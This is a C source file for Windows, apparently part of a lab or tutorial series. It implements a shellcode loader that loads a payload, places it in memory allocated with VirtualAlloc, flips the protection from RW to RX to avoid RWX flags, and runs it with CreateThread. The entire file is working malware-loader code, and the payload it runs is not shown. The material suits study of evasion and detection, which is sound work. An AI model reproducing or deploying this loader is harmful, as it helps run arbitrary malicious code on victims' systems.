#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "../common.h"

int main(int argc, char* argv[]) {
    BYTE* payload = NULL;
    DWORD payloadSize = 0;

    if (!LoadPayload(&payload, &payloadSize)) return 1;

    PrintStep(2, "Allocating memory (RW)");
    LPVOID execMem = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) { PrintError("VirtualAlloc failed"); return 1; }
    printf("[+] Allocated memory at: %p\n", execMem);

    PrintStep(3, "Copying payload to allocated memory");
    memcpy(execMem, payload, payloadSize);
    free(payload);

    PrintStep(4, "Changing memory protection (RW -> RX)");
    DWORD oldProtect;
    if (!VirtualProtect(execMem, payloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
        PrintError("VirtualProtect failed");
        return 1;
    }
    printf("[+] VirtualProtect succeeded, old protect: 0x%lx\n", oldProtect);

    PrintStep(5, "Executing payload via CreateThread");
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (!hThread) { PrintError("CreateThread failed"); return 1; }

    DWORD tid = GetThreadId(hThread);
    printf("[+] Thread created (ID: %lu)\n", tid);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return 0;
}
